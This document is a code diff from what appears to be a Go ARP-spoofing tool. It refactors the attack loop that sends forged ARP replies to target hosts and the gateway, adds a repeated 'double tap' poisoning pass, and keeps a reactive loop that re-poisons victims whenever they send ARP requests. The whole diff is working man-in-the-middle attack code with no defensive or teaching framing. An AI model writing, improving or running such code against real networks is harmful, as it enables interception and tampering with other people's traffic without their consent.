@@ -56,16 +56,18 @@ func (s *Spoofer) Start() error {
 				return
 			case <-ticker.C:
 				targets := s.Session.GetAllTargets()
-				// Paralel Attack Loop
+				// Sequential Attack Loop to prevent goroutine leaks and concurrent pcap crashes
 				for _, t := range targets {
-					go func(target *models.TargetConfig) {
-						s.sendPoison(target.IP, target.MAC, s.GatewayIP, s.MyMAC)
-						s.sendPoison(s.GatewayIP, s.GatewayMAC, target.IP, s.MyMAC)
-						time.Sleep(2 * time.Millisecond)
-						// Double tap
-						s.sendPoison(target.IP, target.MAC, s.GatewayIP, s.MyMAC)
-						s.sendPoison(s.GatewayIP, s.GatewayMAC, target.IP, s.MyMAC)
-					}(t)
+					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
+					s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
+				}
+				
+				time.Sleep(2 * time.Millisecond)
+				
+				// Double tap
+				for _, t := range targets {
+					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
+					s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
 				}
 			}
 		}
@@ -103,24 +105,18 @@ func (s *Spoofer) reactiveLoop() {
 			srcIP := net.IP(arp.SourceProtAddress)
 
 			if reqIP.Equal(s.GatewayIP) {
-				if t := s.findTargetByIP(srcIP); t != nil {
+				if t := s.Session.GetTargetByIP(srcIP); t != nil {
 					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
 				}
 			}
-			if t := s.findTargetByIP(reqIP); t != nil {
+			if t := s.Session.GetTargetByIP(reqIP); t != nil {
 				s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
 			}
 		}
 	}
 }
 
-func (s *Spoofer) findTargetByIP(ip net.IP) *models.TargetConfig {
-	targets := s.Session.GetAllTargets()
-	for _, t := range targets {
-		if t.IP.Equal(ip) { return t }
-	}
-	return nil
-}
+// [REMOVED] findTargetByIP is now handled by SessionManager.GetTargetByIP
 
 func (s *Spoofer) RestoreAll() {
 	targets := s.Session.GetAllTargets()
